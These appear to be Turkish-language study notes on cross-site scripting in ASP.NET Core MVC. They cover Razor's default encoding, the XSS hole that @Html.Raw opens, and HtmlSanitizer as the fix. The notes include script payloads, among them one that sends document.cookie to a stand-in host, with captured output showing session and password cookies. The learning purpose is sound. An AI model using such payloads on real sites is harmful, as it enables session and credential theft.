Controllerda, kullanýcýdan alýnan bilgiler validasyon, kontrol aþamasýndan geçirilmeden direk ViewBage iletildi viewda da direk ekrna yazýldý, iþte bu direk XSS zaafiyeti.
Ancak ASP:Net MVC bunun önlemini almýþ, kullanýcýdan aldýðýný bir encode yapýyor ekrana yazmak için viewda kullanýnca da bir de decode yapýyor aþaðýdaki þekilde denediðimizde ekrana alet verilmiyor bu nedenle.

HomeController:
-------------------
 [HttpPost]
        // Kullanýcýdan aldýðým bilgileri hiçbir iþleme tabi tutmadan htmle gönderiyorum > XSS zaafiyeti nedeni
        public IActionResult CommentAdd(string name, string comment)
        {
            ViewBag.name = name;
            ViewBag.comment = comment; 

            return View();
        }

CommentAdd.cshtml: 
--------------------
  <h1> Yorumlar </h1>
    <strong>@ViewBag.name</strong>
    <hr />
    <span>@ViewBag.comment</span>


textbox içeriði:
* - <script> alert('test')</script> >>>> Network>CommentAdd>Response >  <span>&lt;script&gt; alert(&#x27;test&#x27;)&lt;/script&gt;</span>



<b> Merve </b> ile kalýn yazmak istediðimde bu enconde,decode bunu yapmaz, kodumuzu bunu yapabileceðimiz þekilde deðiþtirmek için aþaðýdaki þekilde @Html.Raw(ViewBag.comment) þekline getirirsek de bu sefer XSS e açýk oluruz.

CommentAdd.cshtml: 
--------------------
   <h1> Yorumlar </h1>
    <strong>@ViewBag.name</strong>
    <hr />
    <span>@Html.Raw(ViewBag.comment)</span>


textbox içeriði:
* - <b> Merve </b>   >>>> Network>CommentAdd>Response >      <b> Merve </b>


Peki cookiler nasýl alýnýr ? 
-------------------------------
CommentAdd get methodunda cookie ekleyelim 2 tane : 

HomeController:
-------------------
  public IActionResult CommentAdd()
        {
            HttpContext.Response.Cookies.Append("email", "abc@abc.com");
            HttpContext.Response.Cookies.Append("password", "1234");

            return View();
        }


textbox içeriði:
* - <script>alert(document.cookie)</script>   >> alert ile tüm cookie bilgilerini gördüm

textbox içeriði:
* - <script>new Image().src="http://www.example.com/cookieOku?hesapbilgisi="+document.cookie </script>  >>>> Network >  

cookieOku?hesapbilgisi=idsrv.session=1D12E2CF6E740…90304904.;%20email=abc%40abc.com;%20password=1234

inanýlmaz. bunu çalýþtýrmaya çalýþtý. biz sanki resim oluþturcakmýþ gb yapýp src özelliiðne kod enjekte ettik ve tarayýcý çalýþtýrmaya çalýþtý. Doðru bir adres olsaydý o adrese bu bilgileri göndermiþti.


Html temizleme : 
HtmlSanitizer vb kütüphaneler var, @ViewBag direk kullanmadan, örneðin richtextbox kullanmam ve html.raw ihtiyacým varsa, sunucu tarafýnda viewbag. atamasý yapmadan evvel aldýðým veriyi önce temizlemem lazým.